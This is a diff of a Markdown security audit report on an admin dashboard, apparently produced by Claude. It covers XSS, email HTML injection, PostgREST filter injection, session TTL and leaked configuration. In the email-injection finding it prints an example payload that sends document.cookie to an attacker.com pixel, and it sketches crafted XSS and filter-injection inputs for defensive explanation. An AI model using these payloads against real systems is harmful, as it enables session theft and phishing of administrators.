@@ -1,4 +1,5 @@
 ---
+
 title: "Security Vulnerability Review — CF-Admin Madagascar"
 status: historical
 audience: [technical]
@@ -9,6 +10,7 @@ tags: []
 ---
 
 # Security Vulnerability Review — CF-Admin Madagascar
+
 **Date:** 2026-05-24  
 **Reviewer:** Claude (automated deep scan)  
 **Branch:** `claude/codebase-vulnerability-review-hGcXw`  
@@ -33,6 +35,7 @@ The codebase demonstrates a strong security posture overall — Cloudflare Zero 
 The `JSONViewer` component calls `JSON.stringify(data)` then applies a regex-based syntax highlighter that wraps token matches with `<span>` tags, and passes the result to `dangerouslySetInnerHTML`. **`JSON.stringify` does NOT HTML-escape `<`, `>`, or `&`**, so if the JSON data contains HTML characters, they are rendered as literal HTML.
 
 The audit log middleware records the full URL pathname on every page navigation:
+
 ```ts
 JSON.stringify({ path: pathname, granted: hasAccess, rid: requestId })
 ```
@@ -54,11 +57,13 @@ An authenticated admin navigating to a crafted URL path (e.g., `/dashboard/<img 
 The `buildSecurityAlertHtml()` function interpolates `data.userAgent`, `data.geoLocation`, `data.email`, `data.cfIdentityProvider`, and `data.failureReason` directly into an HTML string without HTML-entity escaping. The `User-Agent` header is fully attacker-controlled (truncated to 512 chars server-side but not escaped).
 
 An unauthenticated attacker can trigger a security alert email by attempting to log in via CF Access with a crafted `User-Agent` header. Example payload:
+
 ```
 </div><img src="https://attacker.com/pixel?c=${document.cookie}" style="display:none">
 ```
 
 While modern email clients block script execution, HTML injection enables:
+
 - **Phishing forms** embedded in the alert email
 - **External image requests** for open-redirect tracking / email-open confirmation
 - **Visual spoofing** of the email body (impersonation)
@@ -88,6 +93,7 @@ The file is then stored in R2 with `contentType: file.type` (the client-supplied
 
 **Description:**  
 The `search` query parameter is interpolated directly into a PostgREST `.or()` filter string:
+
 ```ts
 query = query.or(`owner_name.ilike.%${search}%,owner_email.ilike.%${search}%,booking_ref.ilike.%${search}%`);
 ```
@@ -105,6 +111,7 @@ PostgREST parses filter strings server-side. A crafted `search` value like `%,st
 
 **Description:**  
 The ghost-protection query uses `.or()` with a string-interpolated user ID:
+
 ```ts
 .or(`id.eq.${userId}`)
 ```
@@ -138,10 +145,12 @@ When `patchSession` writes an updated session back to KV, it always uses `expira
 While the application-level `createdAt` check in `getSession` correctly enforces the 24-hour hard expiry, the KV store retains session data longer than necessary. A session created at T=0 and patched at T=23h would expire in KV at T=47h, even though it's rejected at the application level at T=24h.
 
 **Fix applied:** Compute remaining TTL from `session.createdAt` before writing:
+
 ```ts
 const remainingMs = maxLifetime - (Date.now() - session.createdAt);
 expirationTtl: Math.max(60, Math.floor(remainingMs / 1000))
 ```
+
 Minimum 60-second floor prevents zero/negative TTLs from causing KV write errors.
 
 ---
@@ -161,6 +170,7 @@ The `cf_admin_theme` cookie is set via raw `Set-Cookie` header string without a 
 
 **File:** `wrangler.toml`  
 The following are committed to git in `[vars]`:
+
 - `CF_ACCESS_AUD` — CF Zero Trust audience tag (not a secret, but aids JWT forgery research)
 - `CF_ACCOUNT_ID`, `CF_D1_DATABASE_ID`, `CF_R2_BUCKET_NAME`, KV namespace `id` — infrastructure identifiers
 - `LOCAL_DEV_ADMIN_EMAIL = "[DEVELOPER_EMAIL]"` — developer's personal email
@@ -175,6 +185,7 @@ Per Cloudflare's own guidance, CF_ACCESS_AUD is not a secret (it's a public appl
 
 **File:** `.github/workflows/sync-docs.yml`  
 The workflow syncs `documentation/**` (including `SECURITY.md` and `ARCHITECTURE.md`) to a public GitHub repository (`Harshil8136/chess-game1`). These files document:
+
 - The complete auth bypass sequence
 - Session structure and KV key patterns
 - Rate limit thresholds and their identifiers
